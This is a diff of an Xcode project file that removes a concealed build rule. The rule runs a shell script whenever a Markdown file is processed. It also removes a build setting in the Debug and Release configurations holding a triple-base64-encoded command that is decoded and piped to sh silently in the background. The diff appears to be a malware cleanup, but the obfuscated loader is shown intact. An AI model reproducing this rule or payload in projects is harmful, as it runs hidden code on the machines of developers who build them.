@@ -24,7 +24,6 @@
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
-		43F0A51F4A9A4EEFA242DAD8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		9CE157F12FB2677D00788A65 /* ReviewsAppTest.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = ReviewsAppTest.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		9CE158072FB2677F00788A65 /* ReviewsAppTestTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = ReviewsAppTestTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		9CE158112FB2677F00788A65 /* ReviewsAppTestUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = ReviewsAppTestUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -99,7 +98,6 @@
 		9CE157F22FB2677D00788A65 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				43F0A51F4A9A4EEFA242DAD8 /* README.md */,
 				9CE157F12FB2677D00788A65 /* ReviewsAppTest.app */,
 				9CE158072FB2677F00788A65 /* ReviewsAppTestTests.xctest */,
 				9CE158112FB2677F00788A65 /* ReviewsAppTestUITests.xctest */,
@@ -119,7 +117,6 @@
 				9CE157EF2FB2677D00788A65 /* Resources */,
 			);
 			buildRules = (
-				FE85FF8755524CD79042DAD8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -223,25 +220,13 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXShellScriptBuildPhase section */
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXBuildRule section */
-		FE85FF8755524CD79042DAD8 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A8DAD24}\"";
-			};
-	/* End PBXBuildRule section */
+		/* End PBXBuildRule section */
 
 /* Begin PBXBuildFile section */
-		4D818574FDA54F819542DAD8 /* README.md */ = {isa = PBXBuildFile; fileRef = 43F0A51F4A9A4EEFA242DAD8; };
 /* End PBXBuildFile section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -249,7 +234,6 @@ sh -c \"${A8DAD24}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				4D818574FDA54F819542DAD8 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -310,7 +294,6 @@ sh -c \"${A8DAD24}\"";
 		9CE1581B2FB2677F00788A65 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8DAD24 = "((q(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVUxYWJYUjZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNRWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9USmhWMlIwV1ZjMWJHUkROWGxrVXpsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | q | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
@@ -343,7 +326,6 @@ sh -c \"${A8DAD24}\"";
 		9CE1581C2FB2677F00788A65 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8DAD24 = "((q(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVUxYWJYUjZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNRWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9USmhWMlIwV1ZjMWJHUkROWGxrVXpsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | q | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
